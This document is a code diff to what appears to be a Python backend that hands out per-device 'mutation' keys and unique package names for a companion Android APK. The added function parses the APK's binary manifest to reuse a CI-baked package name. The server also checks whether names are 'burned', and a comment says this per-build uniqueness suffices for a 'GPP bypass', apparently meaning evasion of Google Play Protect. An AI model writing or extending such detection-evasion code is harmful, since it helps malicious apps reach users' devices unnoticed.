@@ -140,6 +140,52 @@ def get_client_ip():
         return cf_ip
     return request.remote_addr
 
+def get_companion_pkg_from_apk() -> str:
+    """Read companion package name from companion.apk in assets.
+    Returns the CI-baked name guaranteed to match what gets installed.
+    Falls back to generate_companion_pkg() if unreadable.
+    """
+    import zipfile as _zf, struct as _st
+    candidates = [
+        os.path.join(REPO_DIR, "app", "src", "main", "assets", "companion.apk"),
+        os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "app", "src", "main", "assets", "companion.apk")),
+    ]
+    for apk_path in candidates:
+        if not os.path.exists(apk_path):
+            continue
+        try:
+            with _zf.ZipFile(apk_path) as z:
+                manifest = z.read("AndroidManifest.xml")
+            sp_off = 8
+            sp_header_size = _st.unpack_from("<H", manifest, sp_off+2)[0]
+            string_count   = _st.unpack_from("<I", manifest, sp_off+8)[0]
+            flags          = _st.unpack_from("<I", manifest, sp_off+16)[0]
+            strings_start  = _st.unpack_from("<I", manifest, sp_off+20)[0]
+            is_utf8        = bool(flags & (1 << 8))
+            offsets_base   = sp_off + sp_header_size
+            str_data_base  = sp_off + strings_start
+            for i in range(min(string_count, 500)):
+                try:
+                    off = _st.unpack_from("<I", manifest, offsets_base + i*4)[0]
+                    pos = str_data_base + off
+                    if is_utf8:
+                        cl = manifest[pos]; pos += 1
+                        if cl & 0x80: cl = ((cl & 0x7f) << 8) | manifest[pos]; pos += 1
+                        bl = manifest[pos]; pos += 1
+                        if bl & 0x80: bl = ((bl & 0x7f) << 8) | manifest[pos]; pos += 1
+                        s = manifest[pos:pos+bl].decode("utf-8", errors="replace")
+                    else:
+                        cl = _st.unpack_from("<H", manifest, pos)[0]; pos += 2
+                        s = manifest[pos:pos+cl*2].decode("utf-16-le", errors="replace")
+                    if s.count(".") == 2 and 10 <= len(s) <= 25 and "android" not in s.lower():
+                        log.info(f"Companion pkg from APK: {s}")
+                        return s
+                except Exception:
+                    continue
+        except Exception as e:
+            log.warning(f"Could not read companion.apk: {e}")
+    return ""
+
 def generate_mutation_seed(device_fingerprint: str, client_token: str) -> str:
     """Generate unique mutation seed from device fingerprint + server secret."""
     raw = f"{device_fingerprint}:{client_token}:{SERVER_SECRET}:{int(time.time()//3600)}"
@@ -287,9 +333,11 @@ def get_mutation_key(token):
 
         # Generate unique package name — check not burned
         attempts = 0
-        pkg_name = generate_companion_pkg()
-        while check_burned(pkg_name) and attempts < 10:
-            attempts += 1
+        # Use CI-baked companion pkg name — M1 runtime patching is incompatible
+        # with V2 signing (breaks verification on Android 8+, same as M8/M9).
+        # Per-build uniqueness via CI is sufficient for GPP bypass.
+        pkg_name = get_companion_pkg_from_apk()
+        if not pkg_name:
             pkg_name = generate_companion_pkg()
 
         # Select M4 path mutation
